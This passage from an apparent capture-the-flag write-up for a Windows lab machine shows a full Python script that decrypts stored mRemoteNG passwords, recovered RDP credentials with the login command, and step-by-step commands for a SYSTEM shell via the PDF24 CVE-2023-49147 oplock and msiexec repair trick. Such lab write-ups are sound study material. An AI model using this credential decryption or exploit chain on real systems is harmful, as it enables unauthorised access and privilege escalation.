InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```
- We immediately can see that this config file is for [mRemoteNG](https://mremoteng.org/), a remote desktop client that allows easy management of `RDP` connections
- We also see that there's a connection for `gale` in this config file!

### Extracting RDP Creds
- Modern `mRemoteNG` creds can be extracted through a combination of AES and HMAC wizardry, but we can easily grab a python script off of [github](https://github.com/kmahyyg/mremoteng-decrypt) 
```python
#!/usr/bin/env python3

import hashlib
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import argparse
import sys
import xml.etree.ElementTree as ET


def decrypt_legacy(encrypted_data, password):
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data = base64.b64decode(encrypted_data)
        initial_vector = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        key = hashlib.md5(password.encode()).digest()
		
        cipher = AES.new(key, AES.MODE_CBC, initial_vector)
        plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size)
        return plaintext
    except Exception as e:
        print("Failed to decrypt the password with the following error: {}".format(e))
        return b''

def decrypt(encrypted_data, password):
    try:
        encrypted_data = encrypted_data.strip()
        encrypted_data = base64.b64decode(encrypted_data)
        salt = encrypted_data[:16]
        associated_data = encrypted_data[:16]
        nonce = encrypted_data[16:32]
        ciphertext = encrypted_data[32:-16]
        tag = encrypted_data[-16:]
        key = hashlib.pbkdf2_hmac(
            "sha1", password.encode(), salt, 1000, dklen=32)
		
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        cipher.update(associated_data)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext
    except Exception as e:
        print("Failed to decrypt the password with the following error: {}".format(e))
        return b''


def main():
    parser = argparse.ArgumentParser(
        description="Decrypt mRemoteNG passwords.")
    if len(sys.argv) < 2:
        parser.print_help(sys.stderr)
        sys.exit(1)
	
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        "-f", "--file", help="Name of file containing mRemoteNG password")
    # Thanks idea from @KingKorSin
    group.add_argument(
        "-rf", "--realFile", help="Name of the Real mRemoteNG connections file containing the passwords")
    group.add_argument(
        "-s", "--string", help="base64 string of mRemoteNG password")
    parser.add_argument("-p", "--password",
                        help="Custom password", default="mR3m")
    parser.add_argument("-L", "--legacy", help="version <= 1.74", type=bool, default=False)
    args = parser.parse_args()
	
    decrypt_func = decrypt
    if args.legacy:
        decrypt_func = decrypt_legacy
	
    if args.realFile != None:
        tree = ET.parse(args.realFile)
        root = tree.getroot()
        for node in root.iter('Node'):
            if node.attrib['Password']:
                decPass = decrypt_func(node.attrib['Password'], args.password)
                if node.attrib['Username']:
                    print("Username: {}".format(node.attrib['Username']))
                if node.attrib['Hostname']:
                    print("Hostname: {}".format(node.attrib['Hostname']))
                print("Password: {} \n".format(decPass.decode("utf-8")))
        sys.exit(1)
	
    elif args.file != None:
        with open(args.file) as f:
            encrypted_data = f.read()
            decPass = decrypt(encrypted_data, args.password)
	
    elif args.string != None:
        encrypted_data = args.string
        decPass = decrypt(encrypted_data, args.password)
	
    else:
        print("Please use either the file (-f, --file) or string (-s, --string) flag")
        sys.exit(1)
	
    try:
        print("Password: {}".format(decPass.decode("utf-8")))
    except Exception as e:
        print("Failed to find the password property with the following error: {}".format(e))


if __name__ == "__main__":
    main()
```

- We can run this without too much worry with
```sh
❯ uv run --script mremoteng_decrypt.py -rf config.xml
Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6 
```

- Now we can get `RDP` with:
```sh
❯ xfreerdp /u:Gale.Dekarios /p:ty8wnW9qCKDosXo6 /v:LOCK
```

# User Shell - gale.dekarios
---
## Enumeration
---
- We boot into the desktop of `gale.dekarios` and can pop open the user.txt:
```text
48cd792311c2e17ce42999b3251d07d9
```

- We also see [PDF24](https://www.pdf24.org/en/) and `mRemoteNG` application shortcuts on the desktop
- Opening `mRemoteNG` doesn't show any connections :(
- A quick lookup of [PDF24 CVEs](https://app.opencve.io/cve/CVE-2023-49147) and we see `CVE-2023-49147` 
![[Pasted image 20251221190306.png]]

# Root Shell
---
## CVE-2023-49147
---
> An issue was discovered in PDF24 Creator 11.14.0. The configuration of the msi installer file was found to produce a visible cmd.exe window when using the repair function of msiexec.exe. This allows an unprivileged local attacker to use a chain of actions (e.g., an oplock on faxPrnInst.log) to open a SYSTEM cmd.exe.

- More information in this [sploitus post](https://sploitus.com/exploit?id=PACKETSTORM:176206)
- Essentially, PDF24 Creator 11.14.0 produces a visible `cmd.exe` window when perforing the repair functionality of `msiexec.exe` 
- The sub-process `pdf24-PrinterInstall.exe` gets called with SYSTEM privileges and performs a write action on the file  `C:\Program Files\PDF24\faxPrnInst.log`
- This can be used by an attacker by simply setting an oplock on the file as soon as it gets read. To do that, one can use the [`SetOpLock.exe`](https://github.com/googleprojectzero/symboliclink-testing-tools) with the following parameters:
	- `SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r`
- If the oplock is set, the cmd window that gets opened when `pdf24-PrinterInstall.exe` is executed doesn't close. The attacker can then perform the following actions to spawn a SYSTEM shell:
	- right click on the top bar of the cmd window  
	- click on properties  
	- under options click on the "Legacyconsolemode" link  
	- open the link with a browser other than internet explorer or edge (both don't open as SYSTEM when on Win11)  
	- in the opened browser window press the key combination CTRL+o  
	- type cmd.exe in the top bar and press Enter

- We grab `SetOpLock.exe` from the [google project zero](https://github.com/googleprojectzero/symboliclink-testing-tools) repo and can copy it over from our file explorer to the `RDP` 
- Then we use it lock `faxPrnInst.log`:
```powershell
PS C:\Users\gale.dekarios\Desktop> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

- We jump to `C:\Program Files\PDF24` and perform an attempted equivalent of `ls -lah | grep -i install`:
```powershell
PS C:\Program Files\PDF24> Get-ChildItem -Force | Where-Object {$_.Name -like "*install*"} #like is case insensitive 
    Directory: C:\Program Files\PDF24
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/22/2023  10:44 PM         334680 pdf24-PrinterInstall.exe
```
- We need the `.msi` file though, this isn't what we want
- After some digging around we find the install directory in `C:\_install` 
```powershell
PS C:\_install> ls -force

    Directory: C:\_install
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi
-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
```

- Now we can run `msiexec.exe` on the installation and perform the vulnerable repair operation
```powershell
PS C:\_install> msiexec.exe /fa .\pdf24-creator-11.15.1-x64.msi
```

- After a couple of inputs we get to the point where we have a hanging `cmd.exe` system shell!
- We can right click the hanging `cmd.exe` prompt, go to properties and open the link to the legacy console mode hyperlink
![[Pasted image 20251221191200.png]]
- We want to open it with something other than internet explorer and microsoft edge (since neither open with system privileges on windows 11)
	- Our only option here is firefox
- With firefox, we can do `CTRL + O` to open a file explorer instance and type `cmd` in the search bar to open a `cmd.exe` instance
![[Pasted image 20251221191425.png]]
![[Pasted image 20251221191702.png]]








